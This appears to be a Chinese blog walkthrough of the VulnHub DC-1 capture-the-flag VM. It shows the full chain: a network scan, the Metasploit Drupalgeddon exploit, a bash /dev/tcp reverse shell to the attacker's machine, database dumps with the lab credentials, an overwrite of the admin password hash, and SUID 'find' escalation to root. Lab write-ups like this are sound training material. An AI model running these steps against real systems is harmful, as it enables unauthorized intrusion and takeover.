<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        何止
    </title>
    
<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            DC系列靶机第一篇
        </p>
        <hr>
    </div>
    <div class="post-content">
        <p>终于闲下来了，搞一搞</p>
<blockquote>
<p>  资源地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-1.zip">https://download.vulnhub.com/dc/DC-1.zip</a></p>
<p>  本机：192.168.3.15</p>
<p>  靶机：192.168.3.16</p>
</blockquote>
<h2 id="1-扫描网段发现主机"><a href="#1-扫描网段发现主机" class="headerlink" title="1. 扫描网段发现主机"></a>1. 扫描网段发现主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.3.0/24</span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0rt76jj30jk05oq3l.jpg" alt="image-20220102201643698"></p>
<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a>2. 信息收集</h2><blockquote>
<p>  Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/2683135">内容管理系统</a>（CMS）和PHP开发框架（Framework）共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。</p>
</blockquote>
<p>首页面</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0uwcxlj30hc0e1aaj.jpg" alt="image-20220102201715831"></p>
<p>版本相关</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzob3ez16j30bt0763yo.jpg" alt="image-20220102213340941"></p>
<h2 id="3-渗透"><a href="#3-渗透" class="headerlink" title="3.渗透"></a>3.渗透</h2><h3 id="3-1-目录扫描"><a href="#3-1-目录扫描" class="headerlink" title="3.1 目录扫描"></a>3.1 目录扫描</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo0y24h1j30od0fz42e.jpg" alt="image-20220102203245812"></p>
<h3 id="3-2-msf"><a href="#3-2-msf" class="headerlink" title="3.2 msf"></a>3.2 msf</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br><span class="line">use exploit/multi/http/drupal_drupageddon <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo12zx0uj30va0oagru.jpg" alt="image-20220102203746287"></p>
<p>执行shell拿到flag1，可知我们需要找配置文件</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo16oth3j30hy09i0ts.jpg" alt="image-20220102204210190"></p>
<p>写一句话后链接一下，找到数据库密码和flag2，并拿到提示“爆破和目录遍历并不是唯一拿到权限的方法”</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1asbz5j30lk0h80ty.jpg" alt="image-20220102205011742"></p>
<p>反弹shell执行sql，并不能进行破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.3.15/4567 0&gt;&amp;1</span><br><span class="line">mysql -udbuser -pR0ck3t -e &quot;show databases;&quot;</span><br><span class="line">mysql -udbuser -pR0ck3t -e &quot;use drupaldb;select  * from users;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1e6lgaj30x203v753.jpg" alt="image-20220102205313820"></p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1bzc1xj31db062di8.jpg" alt="image-20220102210756541"></p>
<p>尝试修改密码</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.hankcs.com/program/drupal/reset-drupal-password.html">https://www.hankcs.com/program/drupal/reset-drupal-password.html</a></p>
<p>由于密文采用sha-512(不确定是不是)所以只需要更改密码为password对应的密文即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t -e &#x27;use drupaldb;select  * from users;update users set pass=&quot;$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4&quot; where name=&quot;admin&quot;;&#x27;</span><br></pre></td></tr></table></figure>

<p>使用admin/password登陆，得到flag3，提示要查看</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1gv2w9j30sv0b6wf7.jpg" alt="image-20220102212656725"></p>
<p>查看shadow和passwd，发现flag4，发现flag4用户有权限且信息存在/home/flag4</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1jhx4ij30kl0ggn0r.jpg" alt="image-20220102213654064"></p>
<p>拿到flag4，发现提示“你可以用同样的手法获得root下的flag吗”</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1m658bj30j607i3zk.jpg" alt="image-20220102213909473"></p>
<h3 id="3-3-提权部分"><a href="#3-3-提权部分" class="headerlink" title="3.3 提权部分"></a>3.3 提权部分</h3><blockquote>
<p>  SUID：Set User ID 是一种权限类型，允许用户使用指定用户的权限执行文件。SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件</p>
</blockquote>
<p>已知的可用来提权的linux可行性的文件列表：nmap、vim、find、bash、more、less、nano、cp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span></span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-print2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000-exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>尝试第一个发现find</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1rmp06j30ft0b1gmp.jpg" alt="image-20220102214349713"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /usr/bin/find</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1tzzaoj30hn01rmx8.jpg" alt="image-20220102214620132"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find h3 -exec &quot;/bin/sh&quot; \; #使用find提权</span><br><span class="line">cat /root/thefinalflag.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo1wyyn8j30hk09ggmq.jpg" alt="image-20220102214846546"></p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>在web提权到admin用户时除了使用sql的update改密码的方法可以使用目录下的sh文件进行获取</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ./scripts/password-hash.sh 12345</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gxzo78do6sj30rh05ggmv.jpg" alt="image-20220102215427332"></p>

    </div>

    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2022 何止</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="IxFMlnhlVtQfoUGr9ijp8odV-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="PgOqIqKdyrNfiySdX8j4YeV0">

<script src="/libs/jquery.min.js"></script>


<script src="/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>